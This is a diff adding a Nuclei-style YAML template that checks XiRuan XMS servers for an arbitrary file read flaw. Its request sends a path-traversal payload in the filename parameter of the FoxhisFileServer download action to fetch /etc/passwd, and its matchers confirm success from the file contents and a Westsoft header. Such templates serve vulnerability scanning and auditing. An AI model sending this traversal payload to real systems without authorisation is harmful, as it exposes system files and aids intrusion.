@@ -1,0 +1,31 @@
+id: poc-yaml-xi-ruan-yun-download-anyfile-read
+
+info:
+  name: XiRuan XMS Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/FoxhisFileServer/action?method=download&filename=/..//..//..//..//..//..//..//..//..//..//..//../etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+      - type: regex
+        part: header
+        regex:
+          - "(?i)Server: Westsoft"
